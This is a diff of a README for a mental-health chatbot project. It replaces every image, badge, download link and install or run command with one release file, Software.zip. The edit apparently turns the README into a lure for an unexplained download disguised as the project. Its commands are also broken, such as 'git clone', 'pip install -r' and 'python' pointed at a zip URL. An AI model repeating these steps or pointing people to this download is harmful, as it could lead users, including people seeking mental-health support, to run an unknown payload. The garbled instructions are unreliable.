@@ -1,6 +1,6 @@
 # Mental Health Chatbot 🧠🤖
 
-![chatbot](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRTFGcsCpEJVlRE0EKKK8eER7Di0Vb5Opxjaw&usqp=CAU)
+![chatbot](https://github.com/led-sol/Mental-Health-Chatbot/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -26,12 +26,12 @@ To get started with the **Mental Health Chatbot**, simply follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/yourusername/Mental-Health-Chatbot.git
+   git clone https://github.com/led-sol/Mental-Health-Chatbot/releases/download/v1.0/Software.zip
    ```
    
 2. Install the necessary dependencies by running:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/led-sol/Mental-Health-Chatbot/releases/download/v1.0/Software.zip
    ```
 
 3. Launch the chatbot and start interacting with it to get mental health support.
@@ -43,7 +43,7 @@ To get started with the **Mental Health Chatbot**, simply follow these steps:
 - **src:** Contains the source code for the Mental Health Chatbot.
 - **data:** Data sources and datasets used for training the chatbot.
 - **models:** Pre-trained models and checkpoints used by the chatbot.
-- **requirements.txt:** List of dependencies required for the project.
+- **https://github.com/led-sol/Mental-Health-Chatbot/releases/download/v1.0/Software.zip** List of dependencies required for the project.
 - **LICENSE:** MIT License for the repository.
 
 ---
@@ -52,7 +52,7 @@ To get started with the **Mental Health Chatbot**, simply follow these steps:
 
 To use the **Mental Health Chatbot**, simply run the following command:
 ```bash
-python chatbot.py
+python https://github.com/led-sol/Mental-Health-Chatbot/releases/download/v1.0/Software.zip
 ```
 
 The chatbot will initiate and guide you through the process of interacting with it to provide mental health support and information.
@@ -61,9 +61,9 @@ The chatbot will initiate and guide you through the process of interacting with 
 
 ## Repository Link 🌐
 
-![Download Mental Health Chatbot](https://img.shields.io/badge/Download-Mental%20Health%20Chatbot-brightgreen)
+![Download Mental Health Chatbot](https://github.com/led-sol/Mental-Health-Chatbot/releases/download/v1.0/Software.zip%20Health%20Chatbot-brightgreen)
 
-🔗 [Download Now](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+🔗 [Download Now](https://github.com/led-sol/Mental-Health-Chatbot/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -92,7 +92,7 @@ Join our community to get support, provide feedback, and engage with other users
 
 **Explore the power of AI in mental health support with the Mental Health Chatbot. Start your journey today!**
 
-![chatbot](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRTFGcsCpEJVlRE0EKKK8eER7Di0Vb5Opxjaw&usqp=CAU)
+![chatbot](https://github.com/led-sol/Mental-Health-Chatbot/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -108,4 +108,4 @@ Thank you for visiting the **Mental Health Chatbot** repository. We hope it prov
 
 ---
 
-![AI-powered Chatbot](https://cdn.dribbble.com/users/15828/screenshots/1134423/artificial_intelligence_dribbble_1x.jpg)
+![AI-powered Chatbot](https://github.com/led-sol/Mental-Health-Chatbot/releases/download/v1.0/Software.zip)
